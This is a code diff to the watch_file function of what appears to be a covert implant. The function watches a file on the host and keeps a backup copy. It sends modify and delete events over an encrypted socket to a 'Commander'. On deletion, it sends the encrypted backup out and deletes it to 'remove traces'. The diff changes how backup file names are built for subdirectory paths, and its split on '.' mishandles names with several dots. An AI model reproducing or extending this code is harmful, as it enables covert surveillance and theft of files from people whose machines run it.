@@ -220,8 +220,13 @@ def watch_file(client_socket: socket.socket,
     modified_files_dict = {file_path: False}
 
     # Create Initial Backup Copy of Watch File
-    backup_file_name = constants.BACKUP_MODIFIER + "_" + file_path.split("/")[-1]
-    create_backup_file(file_path, backup_file_name, modified_files_dict)
+    if "/" in file_path:
+        parsed_path = file_path.split(".")
+        backup_file_name = parsed_path[0] + "_" + constants.BACKUP_MODIFIER + "." + parsed_path[1]
+        create_backup_file(file_path, backup_file_name, modified_files_dict)
+    else:
+        backup_file_name = constants.BACKUP_MODIFIER + "_" + file_path.split("/")[-1]
+        create_backup_file(file_path, backup_file_name, modified_files_dict)
 
     try:
         while True:
@@ -237,8 +242,13 @@ def watch_file(client_socket: socket.socket,
                     (header, type_names, watch_path, _) = event
 
                     # a) Create a backup (most present) copy for any event (in case of deletion)
-                    backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path
-                    create_backup_file(file_path, backup_file_name, modified_files_dict)
+                    if "/" in watch_path:  # If file is in a sub-directory
+                        parsed_path = watch_path.split(".")
+                        backup_file_name = parsed_path[0] + "_" + constants.BACKUP_MODIFIER + "." + parsed_path[1]
+                        create_backup_file(file_path, backup_file_name, modified_files_dict)
+                    else:
+                        backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path  # If file_path is current dir
+                        create_backup_file(file_path, backup_file_name, modified_files_dict)
 
                     # c) If Modified -> Send events to Commander for modification
                     if "IN_MODIFY" in type_names:
@@ -263,23 +273,20 @@ def watch_file(client_socket: socket.socket,
                         print(constants.WATCH_FILE_DELETED.format(watch_path))
                         client_socket.send(encrypt_string("IN_DELETE", shared_secret).encode())
 
-                        # i) Get backup file path
-                        backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path
-
-                        # ii) Start file transfer
+                        # i) Start file transfer
                         encrypted_file = encrypt_file(backup_file_name, shared_secret)
 
-                        # Send encrypted file data
+                        # ii) Send encrypted file data
                         client_socket.sendall(encrypted_file)
 
-                        # Send EOF
+                        # iii) Send EOF
                         client_socket.send(constants.END_OF_FILE_SIGNAL)
                         print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))
 
-                        # iii) Remove traces of backup
+                        # iv) Remove traces of backup
                         remove_file(backup_file_name)
 
-                        # iv) Stop watching file and return to main()
+                        # v) Stop watching file and return to main()
                         print(constants.WATCH_FILE_DELETE_EVENT_END_MSG.format(watch_path))
                         return None
 
